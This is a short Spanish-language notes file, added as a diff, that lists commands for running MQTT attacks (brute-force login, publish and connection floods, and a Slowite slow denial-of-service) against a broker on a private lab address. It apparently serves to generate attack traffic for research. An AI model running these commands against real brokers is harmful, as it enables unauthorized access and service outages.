@@ -1,0 +1,25 @@
+# El código para generar ataques cibernéticos se obtuvo de los siguientes enlaces de GitHub:
+# https://github.com/stfbk/mqttsa
+# https://github.com/fcarli3/MQTT_DoS_attack
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+1. Brute Force
+brute_force("192.168.50.169", "5", 1883, "user1_david", "words.txt", None, None, None) # Modificar esta linea en el codigo
+-> python3 mqtt_brute_force.py
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+2.1. Publish Flood
+-> python3 broker_dos.py "192.168.50.169" -v 5 -p 1883 --topic "ataque/flood/publish" -fc 1 -fcsize 50 -sc 0 -id "mi_cliente" -usr "user1_david" -pwd "pass1_david"
+
+2.2. Connection Flood
+-> python3 broker_dos.py "192.168.50.169" -v 5 -p 1883 --topic "ataque/flood/connection" -fc 1000 -fcsize 1 -sc 0 -id "mi_cliente" -usr "user1_david" -pwd "pass1_david"
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+3. Slowite
+python3 slowite_attack.py -a 192.168.50.169 -p 1883 -k 60
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Error: "OSError: [Errno 24] Too many open files"
+-> ulimit -n 4096
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
